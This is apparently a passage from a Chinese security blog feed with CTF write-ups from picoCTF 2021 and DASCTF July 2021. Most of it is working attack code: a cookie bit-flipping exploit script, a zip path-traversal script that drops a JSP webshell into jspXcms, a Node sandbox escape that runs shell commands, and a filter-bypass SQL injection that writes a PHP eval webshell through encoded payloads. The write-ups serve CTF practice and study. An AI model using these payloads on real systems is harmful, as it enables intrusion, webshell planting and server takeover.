<span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">1328</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token function">i32</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">5</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token function">i32</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">66864</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">6</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token function">i32</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">7</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token function">i32</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"memory"</span> <span class="token punctuation">(</span>memory <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__wasm_call_ctors"</span> <span class="token punctuation">(</span>func <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"strcmp"</span> <span class="token punctuation">(</span>func <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"check_flag"</span> <span class="token punctuation">(</span>func <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"input"</span> <span class="token punctuation">(</span>global <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"copy_char"</span> <span class="token punctuation">(</span>func <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__dso_handle"</span> <span class="token punctuation">(</span>global <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__data_end"</span> <span class="token punctuation">(</span>global <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__global_base"</span> <span class="token punctuation">(</span>global <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__heap_base"</span> <span class="token punctuation">(</span>global <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__memory_base"</span> <span class="token punctuation">(</span>global <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token keyword">export</span> <span class="token string">"__table_base"</span> <span class="token punctuation">(</span>global <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">data</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token string">"picoCTF&#123;d88090e679c48f3945fcaa6a7d6d70c5&#125;\00\00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>关于wasm2wat文件，在<a href="https://github.com/WebAssembly/wabt/releases">https://github.com/WebAssembly/wabt/releases</a><br>选择适合你的系统的打包好的文件。<br>其实直接下载<code>wasm</code>文件后直接打开也可以看到flag字符串。算是一个非预期解吧。</p><h1 id="More-Cookies"><a href="#More-Cookies" class="headerlink" title="More Cookies"></a>More Cookies</h1><blockquote><p>描述：I forgot Cookies can Be modified Client-side, so now I decided to encrypt them!</p><p>Hints: <a href="https://en.wikipedia.org/wiki/Homomorphic_encryption">https://en.wikipedia.org/wiki/Homomorphic_encryption</a></p><p>The search endpoint is only helpful for telling you if you are admin or not, you won’t be able to guess the flag name</p></blockquote><p>进入网站拿cookie</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># cookie</span><span class="token assign-left variable">OERIWnFUQXI2bHNOeHB5cVRmd3FXMkY1SjBpWmdyMXpaU0JFdkVraWhucGdoY0k4dGpBeDFtQ1FMM1oweXdnZFlteGJ5Mmk0bFM0UUc5ZHhvaFFqL0czMGhyQmZ3alNFNHZKbW53eTJYZll1VXBJTW14OHFEb0swTnpDdEMvWU4</span><span class="token operator">=</span><span class="token comment"># base64 -d</span>8DHZqTAr6lsNxpyqTfwqW2F5J0iZgr1zZSBEvEkihnpghcI8tjAx1mCQL3Z0ywgdYmxby2i4lS4QG9dxohQj/G30hrBfwjSE4vJmnwy2XfYuUpIMmx8qDoK0NzCtC/YN┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>└─<span class="token comment"># echo 8DHZqTAr6lsNxpyqTfwqW2F5J0iZgr1zZSBEvEkihnpghcI8tjAx1mCQL3Z0ywgdYmxby2i4lS4QG9dxohQj/G30hrBfwjSE4vJmnwy2XfYuUpIMmx8qDoK0NzCtC/YN | base64 -d | xxd -g 1</span>00000000: f0 <span class="token number">31</span> d9 a9 <span class="token number">30</span> 2b ea 5b 0d c6 9c aa 4d fc 2a 5b  .1<span class="token punctuation">..</span><span class="token number">0</span>+.<span class="token punctuation">[</span><span class="token punctuation">..</span><span class="token punctuation">..</span>M.*<span class="token punctuation">[</span>00000010: <span class="token number">61</span> <span class="token number">79</span> <span class="token number">27</span> <span class="token number">48</span> <span class="token number">99</span> <span class="token number">82</span> bd <span class="token number">73</span> <span class="token number">65</span> <span class="token number">20</span> <span class="token number">44</span> <span class="token function">bc</span> <span class="token number">49</span> <span class="token number">22</span> <span class="token number">86</span> 7a  ay'H<span class="token punctuation">..</span>.se D.I".z00000020: <span class="token number">60</span> <span class="token number">85</span> c2 3c b6 <span class="token number">30</span> <span class="token number">31</span> d6 <span class="token number">60</span> <span class="token number">90</span> 2f <span class="token number">76</span> <span class="token number">74</span> cb 08 1d  <span class="token variable"><span class="token variable">`</span><span class="token punctuation">..</span><span class="token operator">&lt;</span>.01.<span class="token variable">`</span></span>./vt<span class="token punctuation">..</span>.00000030: <span class="token number">62</span> 6c 5b cb <span class="token number">68</span> b8 <span class="token number">95</span> 2e <span class="token number">10</span> 1b d7 <span class="token number">71</span> a2 <span class="token number">14</span> <span class="token number">23</span> fc  bl<span class="token punctuation">[</span>.h<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>q<span class="token punctuation">..</span><span class="token comment">#.</span>00000040: 6d f4 <span class="token number">86</span> b0 5f c2 <span class="token number">34</span> <span class="token number">84</span> e2 f2 <span class="token number">66</span> 9f 0c b6 5d f6  m<span class="token punctuation">..</span>._.4<span class="token punctuation">..</span>.f<span class="token punctuation">..</span>.<span class="token punctuation">]</span>.00000050: 2e <span class="token number">52</span> <span class="token number">92</span> 0c 9b 1f 2a 0e <span class="token number">82</span> b4 <span class="token number">37</span> <span class="token number">30</span> ad 0b f6 0d  .R<span class="token punctuation">..</span><span class="token punctuation">..</span>*<span class="token punctuation">..</span>.70<span class="token punctuation">..</span><span class="token punctuation">..</span></code></pre><p>在cookie的字节中，需要找到类似的admin=0，将其变成admin=1，意思就是将其字节进行翻转。使其构成其相反的意思。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> reURL <span class="token operator">=</span> <span class="token string">"http://mercury.picoctf.net:34962/"</span>COOKIE_NAME <span class="token operator">=</span> <span class="token string">"auth_name"</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL<span class="token punctuation">)</span>    cookie <span class="token operator">=</span> s<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span>COOKIE_NAME<span class="token punctuation">]</span>    raw_cookie <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Cookie: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>cookie<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">with</span> log<span class="token punctuation">.</span>progress<span class="token punctuation">(</span><span class="token string">"Flipping bits"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> p<span class="token punctuation">:</span>        <span class="token keyword">for</span> byte_index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>raw_cookie<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                mask <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> i<span class="token punctuation">)</span>                p<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Trying to flip index </span><span class="token interpolation"><span class="token punctuation">&#123;</span>byte_index<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>raw_cookie<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> with mask </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>mask<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token comment"># Flip the bit</span>                raw_cookie<span class="token punctuation">[</span>byte_index<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> mask                new_cookie <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>raw_cookie<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span>                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>COOKIE_NAME<span class="token punctuation">:</span> new_cookie<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>m<span class="token punctuation">:</span><span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"picoCTF&#123;[^&#125;]+&#125;"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Flipped index </span><span class="token interpolation"><span class="token punctuation">&#123;</span>byte_index<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>raw_cookie<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> with mask </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>mask<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">, Flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                <span class="token comment"># Flip the bit back</span>                raw_cookie<span class="token punctuation">[</span>byte_index<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> mask<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行脚本即可得到flag，看在哪个字节进行翻转可以得到admin权限</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> python3 exploit.py<span class="token punctuation">[</span>x<span class="token punctuation">]</span> Flipping bits: Trying to flip index <span class="token number">9</span>/96 with mask 0x1<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Flipped index <span class="token number">9</span>/96 with mask 0x1, Flag: picoCTF<span class="token punctuation">&#123;</span>cO0ki3s_yum_e40d16a9<span class="token punctuation">&#125;</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Flipping bits: Done</code></pre><h2 id="脚本解析"><a href="#脚本解析" class="headerlink" title="脚本解析"></a>脚本解析</h2><pre class="language-python" data-language="python"><code class="language-python">requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#requests库的session会话对象可以跨请求保持某些参数，就是比如你使用session成功的登录了某个网站，则在再次使用该session对象请求该网站的其他网页都会默认使用该session之前使用的cookie等参数，与刷新网页是有区别的</span>cookie <span class="token operator">=</span> s<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span>COOKIE_NAME<span class="token punctuation">]</span><span class="token comment">#这里设置的cookie是所有请求中都会附带的</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#方法返回一个新字节数组。这个数组里的元素是可变的，并且每个元素的值范围: 0 &lt;= x &lt; 256。</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span>source<span class="token punctuation">[</span><span class="token punctuation">,</span> encoding<span class="token punctuation">[</span><span class="token punctuation">,</span> errors<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#如果 source 为字符串，则按照指定的 encoding 将字符串转换为字节序列；</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#日志的打印方式</span>progress <span class="token comment">#文本进度条</span><span class="token keyword">for</span> byte_index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>raw_cookie<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># raw_cookie的长度，并循环循环这么多次，直到每一个字节的都替换一次</span><span class="token operator">&lt;&lt;</span> 二进制数字位操作的一种<span class="token punctuation">,</span> 前面是被移动的数字<span class="token punctuation">,</span> 后面一个是移动的位数<span class="token punctuation">.</span><span class="token comment">#2 = 0b10</span><span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token comment">#输出: 8</span><span class="token comment">#8 = 0b1000</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#输出: 0b1000</span><span class="token operator">^</span> 异或，也就是这里进行翻转。<span class="token comment">#然后将cookie重新设置为新生成的，加载并刷新网页。在返回包中有匹配到picoCTF&#123;[^&#125;]+&#125;则是flag。</span></code></pre><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF">https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF</a></p><p><a href="https://github.com/xnomas/PicoCTF-2021-Writeups">https://github.com/xnomas/PicoCTF-2021-Writeups</a></p><p><a href="https://github.com/JeffersonDing/CTF/blob/master/pico_CTF_2021">https://github.com/JeffersonDing/CTF/blob/master/pico_CTF_2021</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF题记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2021July复现</title>
      <link href="/posts/e5c925d7/"/>
      <url>/posts/e5c925d7/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/wh.jpg" loading="lazy"><br>爱意东升西落，浪漫至死不渝</p><a id="more"></a><h1 id="0x00引言"><a href="#0x00引言" class="headerlink" title="0x00引言"></a>0x00引言</h1><p>DASCTF的赛题复现</p><h1 id="0x01-Web"><a href="#0x01-Web" class="headerlink" title="0x01 Web"></a>0x01 Web</h1><h2 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/flag/i'</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'cat '</span> <span class="token punctuation">.</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>此处存在任意文件读取漏洞，但是过滤了flag关键字，且存在<code>escapeshellarg</code><br>一般读取文件，思路可以是读取那些固定路径的文件，比如apache的配置文件，nginx的配置文件等，或者是web日志、错误日志等。而恰好这里提示admin曾访问过flag，这里提示是说，有人访问过flag，即日志文件中必定有这个记录，所以直接读取日志文件即可。先读取配置文件，看看日志在哪个目录下<br><code>?cmd=/etc/nginx/nginx.conf</code><br>然后发现了目录<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210803182851.png" loading="lazy"><br>读取日志文件发现了flag的文件名<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210803182942.png" loading="lazy"><br><code>this_is_final_flag_e2a457126032b42d.php</code>绕过flag进行读取<br>Unicode字符绕过请问辅导班v从</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>cmd<span class="token operator">=</span>this_is_final_fl<span class="token operator">%</span>f1ag_e2a457126032b42d<span class="token punctuation">.</span>php</code></pre><h2 id="easythinkphp"><a href="#easythinkphp" class="headerlink" title="easythinkphp"></a>easythinkphp</h2><p>之前在群里看到一个师傅分享过一个tp的一个GUI，于是拿出来用了一下。因为好久没关注了，竟没发现两周前更新了3.x的rce，所以当时只找到了日志泄露，没下一步了。<br>项目地址：<a href="https://github.com/Lotus6/ThinkphpGUI">https://github.com/Lotus6/ThinkphpGUI</a><br>getshell操作，密码为<code>peiqi</code>即可蚁剑连接。</p><h2 id="jspXcms"><a href="#jspXcms" class="headerlink" title="jspXcms"></a>jspXcms</h2><p>搜索jspXcms即可发现很多历史漏洞，而且发现管理后台地址为：<code>http://ip/cmscp/index.do</code><br>弱口令：用户admin，空密码<br>进入后台，在文件管理处有个上传文件的功能，然后发现可以上传zip，其他文件也可以只不过是无法直接连接上传的木马的。<br>然后发现这篇文章：<a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">spxcms解压getshell漏洞</a><br>跟着复现一遍即可。<br>使用冰蝎自带的jsp马，生成一个war文件</p><pre class="language-bash" data-language="bash"><code class="language-bash">jar.exe cf shell.war shell.jsp</code></pre><p>使用脚本进行压缩，压缩一个危险压缩包。</p><pre class="language-py" data-language="py"><code class="language-py">import zipfileif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    try:        binary &#x3D; open(&#39;shell.war&#39;,&#39;rb&#39;).read()        zipFile &#x3D; zipfile.ZipFile(&quot;m0re.zip&quot;, &quot;a&quot;, zipfile.ZIP_DEFLATED)        info &#x3D; zipfile.ZipInfo(&quot;m0re.zip&quot;)        zipFile.writestr(&quot;..&#x2F;..&#x2F;..&#x2F;test.war&quot;, binary)        zipFile.close()    except IOError as e:        raise e</code></pre><p>生成的<code>m0re.zip</code>进行上传，并在后台进行解压<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210803181343.png" loading="lazy"><br>随后即可连接木马<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210803181534.png" loading="lazy"><br>注意路径。与目录穿越有关。<code>../../../test.war</code>这里进行目录穿越。<br>漏洞成因：<br>在该系统中，上传任意文件，但是一个问题限制了对jsp文件的访问，所以直接上传jsp木马是行不通的。<code>在JspDispatcherFilter.java</code>限制了对jsp文件的访问<br>后台还可以上传zip文件，上传后会自动解压，问题出现在<code>WebFileUploadsController.java</code>里的<code>unzip</code>方法，调用了下层方法却没有进行文件名检查，导致目录穿透。<br>随便上传一个文件，即可了解上传路径为<code>/uploads/1/xxx.zip</code>而次web项目是在tomcat目录<code>\webapps\ROOT\</code>下，所以目录为：<code>/webapps/ROOT/uploads/1/</code>这里穿越到<code>webapps</code>目录下即可，所以向上穿三层。</p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><p>参考<a href="https://blog.csdn.net/XavierDarkness/article/details/118662886">https://blog.csdn.net/XavierDarkness/article/details/118662886</a><br>按照步骤来进行<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210804101011.png" loading="lazy"><br>记得开启脚本，然后保存。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token keyword">this</span><span class="token keyword">const</span> ObjectConstructor <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>constructor<span class="token keyword">const</span> FunctionConstructor <span class="token operator">=</span> <span class="token class-name">ObjectConstructor</span><span class="token punctuation">.</span>constructor<span class="token keyword">const</span> myfun <span class="token operator">=</span> <span class="token function">FunctionConstructor</span><span class="token punctuation">(</span><span class="token string">'return process'</span><span class="token punctuation">)</span><span class="token keyword">const</span> process <span class="token operator">=</span> <span class="token function">myfun</span><span class="token punctuation">(</span><span class="token punctuation">)</span>mockJson <span class="token operator">=</span> process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"cat /ffffffflllllaggggg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>访问预览里的地址即可看到flag</p><h2 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h2><p><a href="https://www.cnblogs.com/yuzly/p/11423384.html">https://www.cnblogs.com/yuzly/p/11423384.html</a><br>提示信息收集，发现源码泄露<code>/www.zip</code><br>然后看到sql文件，是数据库里的数据，看一下发现有一个数据库名是<code>bees_admin</code>所以猜测该cms的名字是不是赛博cms，搜索不到，故搜索<code>bees_admin</code>发现了<code>beescms</code>，跟题目是一样的。出题人只是改了名字而已。所以这里找到了<code>beescms</code>的后台SQL注入漏洞，链接在上面，进行复现。<br>后台登录处SQL注入，bypass</p><pre class="language-php" data-language="php"><code class="language-php">union <span class="token operator">=</span><span class="token operator">></span> uni union onselect <span class="token operator">=</span><span class="token operator">></span> selselectectoutfile <span class="token operator">=</span><span class="token operator">></span> outoutfilefileinto <span class="token operator">=</span><span class="token operator">></span> in into</code></pre><p>可以通过利用mysql注入的一个特性就可以达到注入效果(即对shell部分进行Hex编码),或者用mysql函数char()就可以绕过这里的限制。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210804104235.png" loading="lazy"><br>payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token shell-comment comment">#first</span>admi<span class="token operator">%</span><span class="token number">27</span>union<span class="token comment">/**/</span>selselectect<span class="token comment">/**/</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token number">0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e</span><span class="token comment">/**/</span>into<span class="token comment">/**/</span>outoutfilefile<span class="token operator">%</span><span class="token number">27</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>shell<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">23</span><span class="token shell-comment comment">#second</span>admi<span class="token operator">%</span><span class="token number">27</span>union<span class="token comment">/**/</span>selselectect<span class="token comment">/**/</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token function">char</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token comment">/**/</span>into<span class="token comment">/**/</span>outoutfilefile<span class="token operator">%</span><span class="token number">27</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>shel<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">23</span></code></pre><p>蚁剑连接<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210804105003.png" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈PHP原生类反序列化</title>
      <link href="/posts/72ba1cde/"/>
      <url>/posts/72ba1cde/</url>
      
